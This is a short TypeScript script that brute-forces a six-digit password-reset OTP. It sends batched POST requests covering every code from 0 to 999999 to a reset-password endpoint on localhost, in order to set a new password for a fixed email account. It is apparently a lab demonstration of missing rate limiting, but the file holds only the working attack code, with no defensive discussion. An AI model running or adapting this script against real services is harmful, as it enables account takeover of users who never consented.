import axios from 'axios';

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "akash@123.com",
        "otp": otp,
        "newPassword": "ayeinayein1245"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config)
        console.log("done for " + otp);
    } catch (e) {

    }
}

async function main() {
    //batching
    for (let i = 0; i < 1000000; i += 100) {
        const promises = [];
        console.log("here for " + i);
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest((i + j).toString()));
        }
        await Promise.all(promises);
    }
}

main();